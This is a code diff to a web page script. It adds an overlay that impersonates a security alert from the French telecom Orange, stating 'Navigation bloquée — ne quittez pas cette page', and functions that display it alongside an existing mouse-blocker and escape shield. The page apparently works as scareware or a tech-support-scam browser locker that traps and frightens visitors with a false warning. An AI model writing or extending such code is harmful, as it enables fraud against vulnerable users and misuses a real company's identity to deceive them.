@@ -13,8 +13,12 @@
 
   mount.innerHTML =
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
+    '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert">' +
+    '<div class="browser-chrome-modal">' +
+    '<p class="browser-chrome-alert">Alerte de sécurité Orange</p>' +
+    '<p class="browser-chrome-warning">Navigation bloquée — ne quittez pas cette page</p>' +
+    '</div></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
-    '<div class="escape-shield-tabs"></div>' +
     '<div class="escape-shield-taskbar-wrap">' +
     '<div class="escape-shield-taskbar-modal">' +
     '<p class="escape-shield-alert">Alerte de sécurité Orange</p>' +
@@ -181,6 +185,22 @@
     securityOverlay.classList.add("is-active");
     securityOverlay.setAttribute("aria-hidden", "false");
     document.body.classList.add("security-mode");
+    showBrowserChromeShield();
+  }
+
+  function showBrowserChromeShield() {
+    var shield = document.getElementById("browserChromeShield");
+    if (!shield) return;
+    document.body.appendChild(shield);
+    shield.classList.add("is-visible");
+    shield.setAttribute("aria-hidden", "false");
+  }
+
+  function hideBrowserChromeShield() {
+    var shield = document.getElementById("browserChromeShield");
+    if (!shield) return;
+    shield.classList.remove("is-visible");
+    shield.setAttribute("aria-hidden", "true");
   }
 
   function showEscapeShield() {
